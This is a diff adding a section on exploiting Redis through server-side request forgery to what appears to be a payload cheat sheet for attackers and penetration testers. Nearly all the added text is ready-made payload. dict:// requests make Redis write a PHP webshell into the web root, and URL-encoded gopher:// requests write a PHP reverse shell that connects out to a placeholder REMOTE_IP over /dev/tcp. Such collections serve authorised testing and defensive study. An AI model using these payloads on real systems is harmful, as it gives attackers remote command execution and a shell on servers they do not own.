@@ -31,6 +31,7 @@
   * [gopher://](#gopher)
   * [netdoc://](#netdoc)
 * [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
+* [SSRF exploiting Redis](#ssrf-exploiting-redis)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
@@ -387,6 +388,24 @@ gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
 | value length          | (2 bytes) | 12 | (%0C%00)   |   |
 | value data            | (n bytes) |    | /tmp/test.py   |   |
 	
+
+## SSRF exploiting Redis
+
+> Redis is a database system that stores everything in RAM
+
+```powershell
+# Getting a webshell
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+
+# Getting a PHP reverse shell
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+gopher://127.0.0.1:6379/_save
+```
 
 ## SSRF to XSS 
 
